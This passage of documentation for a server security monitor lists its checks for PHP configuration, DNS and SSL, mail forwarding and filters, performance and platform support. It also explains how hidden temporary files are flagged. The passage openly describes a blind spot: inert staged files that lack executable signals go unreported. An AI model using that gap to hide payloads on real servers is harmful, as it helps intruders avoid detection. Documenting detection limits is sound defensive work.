| `open_basedir` | open_basedir restriction validation |
| `php_config_changes` | Security-weakening `.user.ini` and `php.ini` files under account web roots |

## DNS & SSL

| Check | Description |
|-------|-------------|
| `dns_zones` | Security-sensitive DNS zone changes (delegation, mail, apex, and wildcard records) |
| `ssl_certs` | SSL certificate issuance (subdomain takeover) |
| `waf_status` | WAF mode, staleness, bypass detection. On cPanel, staleness follows vendor configuration files that WHM reports as active and ignores retired trees that remain on disk; the warning means at least one loaded vendor has not refreshed in over a month. Other platforms keep the conservative oldest-artifact check so an unused fresh tree cannot hide stale loaded rules. |

## Email Security

| Check | Description |
|-------|-------------|
| `email_weak_password` | Email accounts with weak passwords; in-process verification with [supported hash formats and cost limits](email-av.md#email-password-audit) |
| `email_password_audit_incomplete` | Password verification was interrupted or encountered a hash outside the supported audit formats or limits |
| `email_forwarder_audit` | Forwarders redirecting to external addresses, piping mail to a command, or discarding it. Pipes that run cPanel's autoresponder, BoxTrapper or Mailman list software are not reported. Scheduled and real-time scans interpret command quoting and escaped destination quotes using Exim's rules. |
| `email_mail_filters` | Exim mail filters and dovecot/Roundcube Sieve scripts that copy mail to an external address while keeping a local copy, forward externally, pipe to a command, or blackhole all mail. Sieve is what webmail-managed rules actually execute, so both are scanned. A forward that leaves the mailbox its own copy is what a webmail forward rule produces, so on its own it reports as a Warning for review; it is Critical when an independent forwarding layer on the same mailbox, mail the mailbox never receives, or the same destination across accounts corroborates it. |

## Performance

| Check | Description |
|-------|-------------|
| `perf_php_handler` | PHP handler configuration (DSO vs CGI vs FPM) |
| `perf_mysql_config` | MySQL my.cnf optimization |
| `perf_redis_config` | Redis configuration |
| `perf_error_logs` | Error log file growth (bloat) |
| `perf_wp_config` | WordPress wp-config.php settings |
| `perf_wp_transients` | WordPress database transient bloat |
| `perf_wp_cron` | WordPress cron scheduling (missed crons) |

## Platform Support

The deep checks are the most cPanel-biased part of CSM because they iterate account home directories and per-user public_html trees. On plain Ubuntu/AlmaLinux the account-scan based checks do not run today:

**cPanel-only** (skipped on plain Linux):

- `htaccess`, `file_index`, `php_content`, `group_writable_php`, `symlink_attacks` -- iterate `/home/*/public_html/**`
- `wp_core`, `outdated_plugins`, `vulnerable_plugins`, `db_content`, `db_objects`, `admin_overlap`, `credential_reuse` -- find WordPress installs through the shared discovery: the panel document-root map, `/home/*/public_html`, one directory below it, and addon-domain directories in an account home. Unresolved document-root aliases retain prior findings and cached plugin inventory instead of treating a partial walk as a clean result.
- `supply_chain` -- scans `composer.lock` and `package-lock.json` under `/home/*` and `/home/*/public_html`
- `phishing`, `email_content` -- scan user home directories and Exim spool
- `dns_zones`, `ssl_certs` -- read cPanel's DNS zone store and SSL installation records
- `email_weak_password`, `email_forwarder_audit` -- read `/etc/valiases`, Dovecot/Courier auth databases
- `email_mail_filters` -- read per-mailbox Exim filters under `/home/*/etc/<domain>/<localpart>/filter` and domain filters under `/etc/vfilters`
- `open_basedir` -- reads EA-PHP `php.ini` under `/opt/cpanel/ea-php*/`
- `php_config_changes` -- recursively scans `.user.ini` and `php.ini` below account web roots; incomplete walks emit a coverage finding and preserve prior findings
- `perf_wp_config`, `perf_wp_transients`, `perf_wp_cron`, `perf_php_handler` -- WordPress and PHP handler introspection via cPanel's EA-PHP layout; the WP-Cron check also uses cPanel's domain map for addon and subdomain roots

**Runs on every platform:**

- `filesystem`, `webshells` -- fanotify and file-tree scans over `/home`, `/tmp`, `/dev/shm`
- `rpm_integrity` -- dispatches to `rpm -V` on RHEL family or `debsums` / `dpkg --verify` on Debian family
- `waf_status` -- detects ModSecurity on Apache, Nginx, and LiteSpeed across all supported distros
- `perf_mysql_config`, `perf_redis_config`, `perf_error_logs` -- rely on standard service locations

Operators on plain Linux can point `perf_error_logs`, `perf_wp_config`, `perf_wp_transients`, and `perf_wp_cron` at generic web roots with the `account_roots` glob list (see [configuration.md](configuration.md)). The remaining account and CMS scans still assume the cPanel `/home/*/public_html` layout.

Package integrity rechecks retain a modification that the package verifier still
reports for the flagged file. Changing its executable mode or removing the file
does not by itself resolve that finding.

### Hidden temporary files

The filesystem check reports hidden regular files in the shared temporary
directories when they have executable permissions, ELF magic, or a leading
shebang, long PHP opening tag, or short echo tag. Aliases of the same inode
produce one finding;
distinct files remain separate even when their names match. Failed content
reads leave the filesystem scan incomplete and preserve earlier alerts.

An inert staged blob without these signals is outside this heuristic. There is
no guaranteed alternate detection before it is made executable or interpreted;
signature and runtime detection depend on recognizable content and activity.
Changing its permissions to executable makes it eligible for the next filesystem
scan. This check does not establish that every unreported temporary file is safe.
